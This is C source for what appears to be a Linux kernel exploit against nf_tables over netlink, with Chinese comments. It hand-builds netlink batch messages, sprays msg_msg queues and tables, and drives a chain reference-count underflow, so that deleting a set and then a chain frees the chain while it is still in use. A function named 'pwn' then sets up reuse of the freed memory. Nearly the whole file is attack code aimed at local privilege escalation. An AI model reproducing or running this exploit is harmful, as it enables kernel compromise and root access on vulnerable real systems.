    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[0x1000] = {1,0,0,0,20,0,1,0,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65};
    memcpy(msgcon1+8, pay, paylen);
    memset(msgcon1+4, paylen+4, 1);
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
    
}


void pwn(int sock){
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[0x100];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();


    // ==================================== nlh1 ================================================================

    /*
    {   
        "NFTA_SET_TABLE":"my_table",
        "NFTA_SET_NAME":"my_set@@"

    }


    */

    int pay1_size = 28;  //消息体的大小；
    int nlh1_size = NLMSG_SPACE(pay1_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh1 = (struct nlmsghdr *)malloc(nlh1_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh1, 0, nlh1_size);
    nlh1->nlmsg_len = nlh1_size;
    nlh1->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELSET;;  //注意修改
    nlh1->nlmsg_pid = mypid;
    nlh1->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh1->nlmsg_seq = 0;


    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64};
    memcpy((void *)nlh1+0x10, msgcon1, pay1_size);

    // ==================================== nlh2 ================================================================

    /*
    {   
        "NFTA_SET_TABLE":"my_table",
        "NFTA_SET_NAME":"my_set@@"

    }


    */

    int pay2_size = 28;  //消息体的大小；
    int nlh2_size = NLMSG_SPACE(pay2_size); //整个nlmsghdr的大小

    /* Netlink table message preparation */
    struct nlmsghdr *nlh2 = (struct nlmsghdr *)malloc(nlh2_size); //这里分配的是整个nlmsghdr的空间
    
    memset(nlh2, 0, nlh2_size);
    nlh2->nlmsg_len = nlh2_size;
    nlh2->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELSET;;  //注意修改
    nlh2->nlmsg_pid = mypid;
    nlh2->nlmsg_flags = NLM_F_REQUEST| NLM_F_CREATE;
    nlh2->nlmsg_seq = 0;


    uint8_t msgcon2[] = {1,0,0,0,12,0,1,0,109,121,95,116,116,116,116,116,12,0,2,0,109,121,95,115,101,116,64,64};
    memcpy((void *)nlh2+0x10, msgcon2, pay2_size);

    // =================================== end =====================================================================

    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(iov));
    int tot_iov = 0;
    iov[tot_iov].iov_base = (void *)nlh_batch_begin;
    iov[tot_iov++].iov_len = nlh_batch_begin->nlmsg_len;
    iov[tot_iov].iov_base = nlh1;
    iov[tot_iov++].iov_len = nlh1->nlmsg_len;
    iov[tot_iov].iov_base = nlh2;
    iov[tot_iov++].iov_len = nlh2->nlmsg_len;
    iov[tot_iov].iov_base = (void *)nlh_batch_end;
    iov[tot_iov++].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = tot_iov;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh1);
    free(nlh_batch_begin);
    
}

void begin(){

}
void end(){
    puts("end");
    getchar();
}

#include "fengshui.h"

#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#define KEY_SPEC_PROCESS_KEYRING        -2      /* - key ID for process-specifi*/
#define KEYCTL_REVOKE                   3       /* revoke a key */

#include "netlink.h"

int pipe1[0x10][2];


int main(){

// ===================================== setup ============================
    save_status();
    bindCore(0);
    unshare_setup();

    mypid = getpid();
    int sock;

    if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        perror("socket");
    }
    printf("[+] Netlink socket created\n");

// =================================== prepare msg_msg ======================

    char msg_buf[0x4000];
    #define TOTMSG 0X100
    int msqids[TOTMSG];
    for(int i = 0; i < TOTMSG; i++){
        msqids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    }

// ==================================== trigger =============================
    

    create_table(sock, "my_table");
    create_pipapo_set_MAP(sock);
    //create_binding_chain(sock);
    create_chain(sock, "my_table", "chain001");
    create_chain(sock, "my_table", "my_chain");
    newrule_immediate(sock);
    getrule(sock);

    add_set_elem_bind_chain(sock);
    
    pwn(sock);  // abort 不会进行代际切换               ## chain->use --
    create_chain(sock, "my_table", "my_ccccc");
    //delchain(sock, "my_chain"); // use == 0 ，可以成功free掉chain   

    
    delset(sock); // use == 0, 会导致引用计数检查失败    ## chain->use --
    delchain(sock, "my_chain");
    
    char tname[0x100];
    memset(tname, 0, sizeof(tname));
    for(int i = 0; i < 0x100; i++){
        memset(tname, i, 0x70);
        spray_table(sock, tname);
    }

    getrule(sock);
    delchain(sock, "chain001");
    
    
        

    return ;



    
    
}
